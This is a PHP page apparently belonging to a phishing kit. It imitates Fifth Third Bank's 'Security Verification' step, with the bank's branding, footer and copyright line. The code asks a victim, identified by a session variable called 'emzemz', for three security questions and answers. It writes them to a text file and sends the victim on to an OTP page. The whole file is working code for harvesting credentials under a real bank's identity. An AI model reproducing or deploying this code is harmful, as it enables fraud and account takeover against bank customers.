<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

$questions = [
    'What was your childhood nickname?',
    "What is your mother's maiden name?",
    'What was the name of your first pet?',
    'What was the make and model of your first car?',
    'What city were you born in?',
    'What is your favorite childhood memory?',
    'What was your first job title?',
    'What is the name of your favorite teacher?',
    'What is your favorite book or movie character?',
    'What street did you grow up on?'
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $question1 = $_POST['question1'] ?? '';
    $answer1 = trim($_POST['answer1'] ?? '');
    $question2 = $_POST['question2'] ?? '';
    $answer2 = trim($_POST['answer2'] ?? '');
    $question3 = $_POST['question3'] ?? '';
    $answer3 = trim($_POST['answer3'] ?? '');
    
    // Validation
    if (empty($question1)) $errors['question1'] = 'Please select a question';
    if (empty($answer1)) $errors['answer1'] = 'Please provide an answer';
    if (empty($question2)) $errors['question2'] = 'Please select a question';
    if (empty($answer2)) $errors['answer2'] = 'Please provide an answer';
    if (empty($question3)) $errors['question3'] = 'Please select a question';
    if (empty($answer3)) $errors['answer3'] = 'Please provide an answer';
    
    // Check for duplicate questions
    $uniqueQuestions = array_unique([$question1, $question2, $question3]);
    if (count($uniqueQuestions) < 3) {
        $errors['general'] = 'Please select three different security questions';
    }
    
    if (empty($errors)) {
        // Save security questions data
        $data = [
            'step' => 'security_questions',
            'usrnm' => $username,
            'emzemz' => $username,
            'chld_pt' => $question1,
            'pt_ans' => $answer1,
            'brth_ct' => $question2,
            'ct_ans' => $answer2,
            'frst_sch' => $question3,
            'sch_ans' => $answer3
        ];
        
        saveUserData('security_questions.txt', $data);
        
        // Redirect to OTP page
        header('Location: otp.php');
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fifth Third Bank - Security Questions</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white flex flex-col text-[#1b1b1b]">
        <!-- Header -->
        <header class="bg-white border-b border-gray-200">
            <div class="max-w-6xl mx-auto flex flex-wrap items-center justify-between px-6 py-4 gap-4">
                <div class="flex items-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Bank" class="h-12 w-auto" />
                </div>
                <div class="text-xs sm:text-sm text-gray-700 flex items-center gap-3 uppercase tracking-wide">
                    <a href="#" class="hover:text-[#003087]">Customer Service</a>
                    <span class="text-gray-300">|</span>
                    <a href="#" class="hover:text-[#003087]">Branch &amp; ATM Locator</a>
                </div>
            </div>
        </header>

        <!-- Blue Gradient Section with Security Questions Card -->
        <section class="bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6] py-16 px-4">
            <div class="max-w-6xl mx-auto">
                <!-- Breadcrumb -->
                <div class="mb-6 flex items-center gap-2 text-sm text-white/90">
                    <a href="#" class="text-white/70 hover:text-white">Home</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="index.php" class="text-white/70 hover:text-white">Login</a>
                    <span class="text-white/50">&#8250;</span>
                    <span class="font-semibold">Security Questions</span>
                </div>

                <!-- Security Questions Card -->
                <div class="flex justify-center">
                    <div class="bg-[#f4f2f2] max-w-lg w-full rounded-md shadow-[0_12px_30px_rgba(0,0,0,0.25)] border border-gray-200">
                        <div class="px-8 py-6">
                            <h1 class="text-2xl font-bold text-gray-800 mb-2">Security Verification</h1>
                            <p class="text-sm text-gray-600 mb-6">Please answer the following security questions to verify your identity.</p>
                            
                            <!-- Error Display -->
                            <?php if (!empty($errors)): ?>
                                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                                    <div class="flex">
                                        <div class="flex-shrink-0">
                                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                Please fix the following errors:
                                                <ul class="list-disc pl-5 mt-1">
                                                    <?php foreach ($errors as $error): ?>
                                                        <li><?php echo htmlspecialchars($error); ?></li>
                                                    <?php endforeach; ?>
                                                </ul>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <form method="POST" class="space-y-6">
                                <!-- Question 1 -->
                                <div>
                                    <label for="question1" class="block text-sm font-semibold text-gray-700 mb-2">
                                        Security Question 1
                                    </label>
                                    <select
                                        id="question1"
                                        name="question1"
                                        class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                    >
                                        <option value="">Select a security question</option>
                                        <?php foreach ($questions as $q): ?>
                                            <option value="<?php echo htmlspecialchars($q); ?>" <?php echo (isset($_POST['question1']) && $_POST['question1'] === $q) ? 'selected' : ''; ?>>
                                                <?php echo htmlspecialchars($q); ?>
                                            </option>
                                        <?php endforeach; ?>
                                    </select>
                                    <?php if (isset($errors['question1'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['question1']); ?></p>
                                    <?php endif; ?>
                                    
                                    <input
                                        type="text"
                                        name="answer1"
                                        placeholder="Enter your answer"
                                        value="<?php echo htmlspecialchars($_POST['answer1'] ?? ''); ?>"
                                        class="w-full mt-3 border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                    />
                                    <?php if (isset($errors['answer1'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['answer1']); ?></p>
                                    <?php endif; ?>
                                </div>

                                <!-- Question 2 -->
                                <div>
                                    <label for="question2" class="block text-sm font-semibold text-gray-700 mb-2">
                                        Security Question 2
                                    </label>
                                    <select
                                        id="question2"
                                        name="question2"
                                        class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                    >
                                        <option value="">Select a security question</option>
                                        <?php foreach ($questions as $q): ?>
                                            <option value="<?php echo htmlspecialchars($q); ?>" <?php echo (isset($_POST['question2']) && $_POST['question2'] === $q) ? 'selected' : ''; ?>>
                                                <?php echo htmlspecialchars($q); ?>
                                            </option>
                                        <?php endforeach; ?>
                                    </select>
                                    <?php if (isset($errors['question2'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['question2']); ?></p>
                                    <?php endif; ?>
                                    
                                    <input
                                        type="text"
                                        name="answer2"
                                        placeholder="Enter your answer"
                                        value="<?php echo htmlspecialchars($_POST['answer2'] ?? ''); ?>"
                                        class="w-full mt-3 border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                    />
                                    <?php if (isset($errors['answer2'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['answer2']); ?></p>
                                    <?php endif; ?>
                                </div>

                                <!-- Question 3 -->
                                <div>
                                    <label for="question3" class="block text-sm font-semibold text-gray-700 mb-2">
                                        Security Question 3
                                    </label>
                                    <select
                                        id="question3"
                                        name="question3"
                                        class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                    >
                                        <option value="">Select a security question</option>
                                        <?php foreach ($questions as $q): ?>
                                            <option value="<?php echo htmlspecialchars($q); ?>" <?php echo (isset($_POST['question3']) && $_POST['question3'] === $q) ? 'selected' : ''; ?>>
                                                <?php echo htmlspecialchars($q); ?>
                                            </option>
                                        <?php endforeach; ?>
                                    </select>
                                    <?php if (isset($errors['question3'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['question3']); ?></p>
                                    <?php endif; ?>
                                    
                                    <input
                                        type="text"
                                        name="answer3"
                                        placeholder="Enter your answer"
                                        value="<?php echo htmlspecialchars($_POST['answer3'] ?? ''); ?>"
                                        class="w-full mt-3 border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                    />
                                    <?php if (isset($errors['answer3'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['answer3']); ?></p>
                                    <?php endif; ?>
                                </div>

                                <!-- Submit Button -->
                                <button
                                    type="submit"
                                    class="w-full bg-[#123b9d] hover:bg-[#0f2f6e] text-white font-semibold py-3 rounded-sm uppercase tracking-wide transition"
                                >
                                    Continue
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Information Section -->
        <section class="bg-white py-12 px-4 flex-1">
            <div class="max-w-6xl mx-auto space-y-8">
                <h2 class="text-2xl font-semibold text-gray-900">Security Verification</h2>
                <p class="mt-3 text-gray-700 leading-relaxed">
                    For your protection, we need to verify your identity with security questions. These questions help us ensure that only authorized individuals can access your account information.
                </p>

                <div class="grid gap-6 md:grid-cols-2">
                    <div class="border border-gray-200 rounded-md p-6 bg-[#f8f8f8]">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Why Security Questions?</h3>
                        <p class="text-sm text-gray-700 leading-relaxed">
                            Security questions provide an additional layer of protection for your account. They help verify your identity when accessing sensitive information or performing certain transactions.
                        </p>
                    </div>

                    <div class="border border-gray-200 rounded-md p-6 bg-white shadow-sm">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Tips for Good Answers</h3>
                        <p class="text-sm text-gray-700 leading-relaxed mb-3">
                            Choose answers that are memorable to you but difficult for others to guess. Avoid using information that can be easily found on social media or public records.
                        </p>
                        <ul class="text-sm text-gray-700 space-y-1">
                            <li>• Use specific, personal memories</li>
                            <li>• Avoid common or obvious answers</li>
                            <li>• Keep answers consistent across accounts</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

        <!-- Footer -->
        <footer class="bg-[#f4f4f4] border-t border-gray-200">
            <div class="max-w-6xl mx-auto px-6 py-10 text-center">
                <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 text-sm text-gray-700">
                    <?php foreach ($footerLinks as $index => $label): ?>
                        <a href="#" class="hover:text-[#003087] underline-offset-4 hover:underline">
                            <?php echo htmlspecialchars($label); ?>
                        </a>
                        <?php if ($index < count($footerLinks) - 1): ?>
                            <span class="text-gray-400">|</span>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </div>

                <p class="mt-5 text-sm text-gray-700">
                    Copyright © 2025 Fifth Third Bank, National Association. All Rights Reserved. Member FDIC.
                    <span class="inline-flex items-center gap-1 font-semibold">
                        <span role="img" aria-label="house">🏠</span>
                        Equal Housing Lender.
                    </span>
                </p>

                <div class="mt-6 flex items-center justify-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Logo" class="h-10 w-auto" />
                </div>
            </div>
        </footer>
    </div>

    <script>
        // Auto-focus first question dropdown on page load
        document.addEventListener('DOMContentLoaded', function() {
            const firstQuestion = document.getElementById('question1');
            if (firstQuestion) {
                firstQuestion.focus();
            }
        });
    </script>
</body>
</html>
